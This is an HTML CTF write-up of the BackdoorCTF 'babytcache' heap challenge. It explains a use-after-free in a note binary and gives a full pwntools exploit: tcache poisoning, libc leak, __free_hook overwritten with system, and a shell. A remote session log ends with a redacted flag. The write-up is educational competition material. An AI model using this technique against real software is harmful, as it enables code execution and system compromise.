@@ -1,0 +1,276 @@
+I"S|<p>I played this CTF with 0x1 and got 9th place.</p>
+
+<p>This was a very trivial tcache challenge.</p>
+
+<p>TL;DR:</p>
+
+<ol>
+  <li>Leak a heap address using double free.</li>
+  <li>Tcache poisoning attack to get a chunk right in the <code class="highlighter-rouge">tcache_perthread_struct</code> structure at the beginning of the heap.</li>
+  <li>Overwrite the count of 0x80 tcache bin to 7.</li>
+  <li>Free a 0x80 chunk to get a libc leak.</li>
+  <li>Tcache poisoning attack again to overwrite <code class="highlighter-rouge">__free_hook</code> to <code class="highlighter-rouge">system</code>.</li>
+  <li>Free a chunk whose first 8 bytes are <code class="highlighter-rouge">'/bin/sh\x00'</code> for shell.</li>
+</ol>
+
+<h3 id="challenge">Challenge</h3>
+
+<p><strong>Points</strong>: 201</p>
+
+<blockquote>
+  <p>At least let me free 7 tcaches.</p>
+
+  <p><a href="http://backdoor.static.beast.sdslabs.co/static/babytcache/babytcache">http://backdoor.static.beast.sdslabs.co/static/babytcache/babytcache</a></p>
+
+  <p><a href="http://backdoor.static.beast.sdslabs.co/static/babytcache/libc.so.6">http://backdoor.static.beast.sdslabs.co/static/babytcache/libc.so.6</a></p>
+
+  <p><code class="highlighter-rouge">nc 51.158.118.84 17002</code></p>
+
+  <p>Flag format: CTF{…}</p>
+
+  <p>Created by: <a href="https://backdoor.sdslabs.co/users/fs0ciety">Nipun Gupta</a></p>
+
+  <p>No. of Correct Submissions: 22</p>
+</blockquote>
+
+<h3 id="solution">Solution</h3>
+
+<p>I won’t go into too much detail about the solution, as it is very simple in my opinion. If you do have any questions, feel free to DM me on twitter or email me.</p>
+
+<h4 id="reverse-engineering">Reverse Engineering</h4>
+
+<p>Running the binary gives us the following menu:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>----------BABYTCACHE----------
+1) Add note
+2) Edit note
+3) Free note
+4) View note
+5) Exit
+&gt;&gt; 
+</code></pre></div></div>
+
+<p>When reverse engineering the binary, we note three things. The first is that there is global variable that I named <code class="highlighter-rouge">free_limit</code>. It is initially set to 5 and decremented after every free, meaning we only get 5 frees total.</p>
+
+<p>Second, there is a UAF in the <code class="highlighter-rouge">free_note</code> function since the global <code class="highlighter-rouge">notes</code> array does not have it’s indexes zeroed out after each free:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">free_note</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">temp</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Note index:"</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+  <span class="n">idx</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">result</span> <span class="o">&lt;=</span> <span class="mi">7</span><span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">notes_array</span><span class="p">[</span><span class="n">result</span><span class="p">])</span>
+    <span class="p">{</span>
+      <span class="n">temp</span> <span class="o">=</span> <span class="n">free_limit</span><span class="o">--</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">temp</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Sorry no more removal</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">notes_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"done"</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"This Note is empty"</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Finally, as a consequence of the UAF, we see in the <code class="highlighter-rouge">add_note</code> function that we are only allowed to allocate a maximum of 8 chunks:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">add_note</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Note index:"</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+  <span class="n">idx</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">idx</span> <span class="o">&lt;=</span> <span class="mi">7</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">notes_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
+      <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"This note is occupied</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Note size:"</span><span class="p">);</span>
+    <span class="n">notes_size_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_int</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">notes_size_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x80000000</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">notes_size_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mh">0x200</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">notes_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">notes_size_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">notes_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="p">)</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Note data:"</span><span class="p">);</span>
+      <span class="k">return</span> <span class="n">read_data</span><span class="p">(</span><span class="n">notes_array</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="n">notes_size_array</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
+    <span class="p">}</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid size"</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This tells us one thing: in order to get a libc leak, we can’t do the classic “Fill a tcache bin with 7 chunks and the 8th free will go into the unsorted bin and provide a leak”, since we are limited to 5 frees.</p>
+
+<h4 id="steps-to-solve">Steps to solve</h4>
+
+<p>I initially set up three chunks and did a double free to get a heap leak as follows:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># Used for heap leak
+</span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># Used for libc leak
+</span><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># Prevent consolidation with top
+</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x260</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Heap base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>With the heap leak, I got a chunk inside the <code class="highlighter-rouge">tcache_perthread_structure</code> and overwrote the size value of the 0x80 tcache bin to make it look like its full:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Tcache poisoning attack
+</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x10</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0700000000000000</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Freeing the chunk at index 1 will now send it to the unsorted bin and provide us a libc leak:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Leak libc
+</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Then I simply edited the chunk that we already had in the <code class="highlighter-rouge">tcache_perthread_struct</code> and made the 0x80 tcache bin pointer point to <code class="highlighter-rouge">__free_hook</code>, and then overwrote <code class="highlighter-rouge">__free_hook</code> with <code class="highlighter-rouge">system</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x78</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>
+</code></pre></div></div>
+
+<p>Finally, I edited chunk 0 to make its first 8 bytes <code class="highlighter-rouge">'/bin/sh\x00'</code> and freed it to get a shell:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/practice/backdoorctf/babytcache<span class="nv">$ </span>./exploit.py REMOTE
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/practice/backdoorctf/babytcache/babytcache'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/practice/backdoorctf/babytcache/libc.so.6'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+REMOTE PROCESS
+<span class="o">[</span>+] Opening connection to 51.158.118.84 on port 17002: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Heap base: 0x55de298cb000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7fbf7f248000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">ls
+</span>Dockerfile
+babytcache
+babytcache.c
+beast.toml
+flag.txt
+post-build.sh
+public
+setup.sh
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+CTF<span class="o">{</span>REDACTEDREDACTEDREDACTED<span class="o">}</span>
+<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h3 id="full-exploit">Full Exploit</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./babytcache'</span>
+<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'51.158.118.84'</span><span class="p">,</span> <span class="mi">17002</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+  <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"LOCAL PROCESS"</span>
+    <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">"REMOTE PROCESS"</span>
+    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_base_address</span><span class="p">(</span><span class="n">proc</span><span class="p">):</span>
+  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"/proc/{}/maps"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pid</span><span class="p">),</span> <span class="s">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
+    <span class="n">script</span> <span class="o">=</span> <span class="s">"handle SIGALRM ignore</span><span class="se">\n</span><span class="s">"</span>
+    <span class="n">PIE</span> <span class="o">=</span> <span class="n">get_base_address</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">script</span> <span class="o">+=</span> <span class="s">"set $_base = 0x{:x}</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">PIE</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
+        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">PIE</span><span class="o">+</span><span class="n">bp</span><span class="p">)</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">':</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">':</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+  <span class="n">debug</span><span class="p">([])</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># Used for heap leak
+</span><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># Used for libc leak
+</span><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span> <span class="c1"># Prevent consolidation with top
+</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x260</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Heap base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">))</span>
+
+<span class="c1"># Tcache poisoning attack
+</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0x10</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0700000000000000</span><span class="p">))</span>
+
+<span class="c1"># Leak libc
+</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">':'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x78</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+:ET
